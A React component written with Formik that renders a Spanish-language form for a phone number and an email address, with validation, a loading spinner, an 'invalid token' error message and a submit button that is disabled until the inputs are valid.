import { useFormik } from 'formik'
import { EmailAndPhoneInput } from './EmailAndPhoneInput'
import { emailAndPhoneValidate } from '../../../../security/emailAndPhoneValidate'
import { Spiner } from '../../../Spiner'
import { submitBase } from '../../../../helpers/submitBase'
import { useGeneralData } from '../../../../hooks/useGeneralData'

const initialValues = { celular: '', correo: '' }

export const EmailAndPhone = () => {
    
    const dataImportant = useGeneralData({ spiner: true,  modeLive: false, timeLoader: 2000 })

    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues,
        validate: values => emailAndPhoneValidate({values}),
        onSubmit: async(valuesData) => submitBase({dataImportant, valuesData, endUrl})
    })

    return (<div>
        <div>
              {/* Spiner de carga */}
              {
                  dataImportant.showSpiner === true ? <Spiner /> : null
              }
              <div className='' />          
    
              
                  <form className='flex flex-col' onSubmit={handleSubmit}>
                     
                          {
                            dataImportant.liveError && <p className='bg-red-500 p-2 text-white text-sm rounded'>Token invalido por favor verifique e introduzca de nuevo</p>
                          }
                          <EmailAndPhoneInput
                            handleBlur={handleBlur} 
                            handleChange={handleChange} 
                            celular={values.celular}
                            correo={values.correo}
                            errors={errors}
                            touched={touched}  
                        />

                        <button 
                          disabled={
                                (
                                    touched.celular && 
                                    errors.celular || 
                                    values.celular.length <= 9
                                )
                                ||
                                (

                                    touched.correo && 
                                    errors.correo || 
                                    values.correo.length == 0
                                )
                                // eslint-disable-next-line eqeqeq
                                == true ? true : false
                          }
                          className=''
                          type='submit'
                        >
                            Ingresar
                        </button>
    
                  </form>
              
          </div>
        
      </div>
    )
}
